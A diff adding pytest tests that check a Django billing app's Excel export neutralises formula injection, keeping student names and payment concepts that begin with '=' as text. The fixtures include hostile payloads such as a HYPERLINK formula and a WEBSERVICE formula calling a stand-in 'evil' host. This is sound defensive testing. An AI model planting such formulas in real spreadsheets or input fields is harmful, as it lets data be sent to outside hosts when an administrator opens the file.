@@ -1,5 +1,8 @@
 """Tests for billing.exports — Excel workbook generation."""
 
+from datetime import date
+from decimal import Decimal
+
 import pytest
 
 from billing.exports import (
@@ -8,8 +11,12 @@ from billing.exports import (
     build_payments_sheet,
     build_students_sheet,
 )
+from billing.models import Payment
+from core.utils import xlsx_safe_append
 
 pytestmark = pytest.mark.django_db
+
+HOSTILE_FORMULA = '=HYPERLINK("http://evil/","x")'
 
 
 class TestBuildStudentsSheet:
@@ -81,3 +88,55 @@ class TestBuildDatabaseWorkbook:
         # All sheets should have header only
         for ws in wb.worksheets:
             assert ws.max_row == 1
+
+
+class TestXlsxFormulaInjection:
+    """openpyxl marks a leading-`=` string as a FORMULA cell, so a name typed by
+    a non-admin teacher becomes live code in the workbook an admin opens.
+
+    `csv_safe`'s leading apostrophe cannot help here — in xlsx it is stored
+    verbatim and just renames the student — so `xlsx_safe_append` forces the
+    cell back to a string instead.
+    """
+
+    def test_the_guard_neutralises_a_formula_without_altering_the_text(self):
+        import openpyxl
+
+        ws = openpyxl.Workbook().active
+        xlsx_safe_append(ws, [HOSTILE_FORMULA, "plain", 42])
+
+        cells = list(ws[1])
+        assert cells[0].data_type == "s", "a leading '=' must not stay a formula cell"
+        assert cells[0].value == HOSTILE_FORMULA, "the text itself must survive intact"
+        assert cells[2].value == 42, "non-strings are untouched"
+
+    def test_the_database_workbook_contains_no_live_formulas(self, student, parent, active_enrollment):
+        student.first_name = HOSTILE_FORMULA
+        student.school = "=1+1"
+        student.save(update_fields=["first_name", "school"])
+        Payment.objects.create(
+            student=student,
+            parent=parent,
+            enrollment=active_enrollment,
+            payment_type="monthly",
+            amount=Decimal("54.00"),
+            payment_status="pending",
+            due_date=date(2025, 10, 31),
+            concept='=WEBSERVICE("http://evil/")',
+        )
+
+        formulas = [
+            (ws.title, c.coordinate, c.value)
+            for ws in build_database_workbook().worksheets
+            for row in ws.iter_rows()
+            for c in row
+            if c.data_type == "f"
+        ]
+        assert formulas == [], f"export wrote live formulas: {formulas}"
+
+    def test_the_suspicious_text_is_still_readable_in_the_export(self, student):
+        student.first_name = HOSTILE_FORMULA
+        student.save(update_fields=["first_name"])
+
+        ws = build_database_workbook()["Estudiantes"]
+        assert HOSTILE_FORMULA in [c.value for row in ws.iter_rows() for c in row]
